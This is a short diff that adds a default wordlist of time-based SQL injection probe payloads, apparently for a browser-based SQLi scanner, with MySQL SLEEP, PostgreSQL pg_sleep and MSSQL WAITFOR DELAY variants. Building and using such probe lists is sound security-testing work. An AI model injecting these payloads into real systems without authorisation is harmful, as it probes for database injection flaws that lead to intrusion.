@@ -1,0 +1,8 @@
+# SQLi time-probe payloads — default seed list.
+# Generated from DEFAULT_SQLI_TIME_PAYLOADS in sqliProbe.ts.
+# Pass this path as timePayloadWordlistPath on browser_sqli to use these as a base,
+# or create your own file (one payload per line, # = comment) to override.
+' AND SLEEP(5)--
+" AND SLEEP(5)--
+'; SELECT pg_sleep(5)--
+; WAITFOR DELAY '0:0:5'--
